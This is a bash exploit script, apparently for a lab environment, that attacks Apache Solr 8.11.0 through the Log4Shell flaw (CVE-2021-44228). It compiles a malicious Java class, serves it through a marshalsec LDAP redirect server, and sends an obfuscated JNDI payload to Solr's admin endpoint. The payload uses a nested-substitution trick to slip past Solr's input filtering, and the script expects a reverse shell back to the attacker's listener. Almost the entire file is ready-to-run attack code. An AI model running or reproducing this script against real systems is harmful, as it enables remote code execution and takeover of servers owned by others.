#!/bin/bash
# Log4Shell (CVE-2021-44228) exploit against Apache Solr 8.11.0
# Usage: ./01-log4shell.sh [SOLR_HOST] [LHOST] [LPORT]

set -e

SOLR_HOST="${1:-172.26.0.20}"
SOLR_PORT=8983
LHOST="${2:-172.26.0.10}"
LPORT="${3:-4444}"
LDAP_PORT=1389
HTTP_PORT=8888

PAYLOAD_DIR="/opt/payloads"
MARSHALSEC_JAR="/opt/marshalsec/target/marshalsec-0.0.3-SNAPSHOT-all.jar"

echo "[*] Log4Shell exploit (CVE-2021-44228)"
echo "[*] Target: ${SOLR_HOST}:${SOLR_PORT}"
echo "[*] Callback: ${LHOST}:${LPORT}"
echo ""

# Step 1: Compile the malicious Java class
echo "[1/4] Compiling Evil.java..."
cd "$PAYLOAD_DIR"
LHOST="$LHOST" LPORT="$LPORT" javac Evil.java
echo "      Evil.class ready"

# Step 2: Start HTTP server to serve the .class file
echo "[2/4] Starting HTTP server on port ${HTTP_PORT}..."
cd "$PAYLOAD_DIR"
python3 -m http.server "$HTTP_PORT" &
HTTP_PID=$!
sleep 1
echo "      HTTP server PID: ${HTTP_PID}"

# Step 3: Start marshalsec LDAP server
echo "[3/4] Starting LDAP redirect server on port ${LDAP_PORT}..."
java -cp "$MARSHALSEC_JAR" marshalsec.jndi.LDAPRefServer "http://${LHOST}:${HTTP_PORT}/#Evil" "$LDAP_PORT" &
LDAP_PID=$!
sleep 2
echo "      LDAP server PID: ${LDAP_PID}"

# Step 4: Send the JNDI payload to Solr
echo "[4/4] Sending JNDI payload to Solr..."
echo ""

# Solr 8.11.0 has a built-in ${...} variable resolver that strips simple payloads
# before Log4j ever sees them. Use the nested-substitution bypass — Solr's naive
# parser fails on nested ${}, but Log4j's recursive resolver reassembles "jndi"
# from the inner ${::-j}${::-n}${::-d}${::-i} parts.
PAYLOAD="\${\${::-j}\${::-n}\${::-d}\${::-i}:ldap://${LHOST}:${LDAP_PORT}/Evil}"
echo "      Payload: ${PAYLOAD}"
echo ""

# URL-encode the payload so curly braces and colons survive HTTP parsing
ENCODED_PAYLOAD=$(printf '%s' "$PAYLOAD" | jq -sRr @uri)

curl -s "http://${SOLR_HOST}:${SOLR_PORT}/solr/admin/cores?action=${ENCODED_PAYLOAD}" -o /dev/null || true

echo ""
echo "[*] Payload sent! If successful, reverse shell connects to ${LHOST}:${LPORT}"
echo "[*] Start listener with: nc -lvnp ${LPORT}"
echo ""
echo "[*] Press Ctrl+C to stop LDAP and HTTP servers"

# Cleanup on exit
trap "kill $HTTP_PID $LDAP_PID 2>/dev/null; echo '[*] Servers stopped'" EXIT
wait
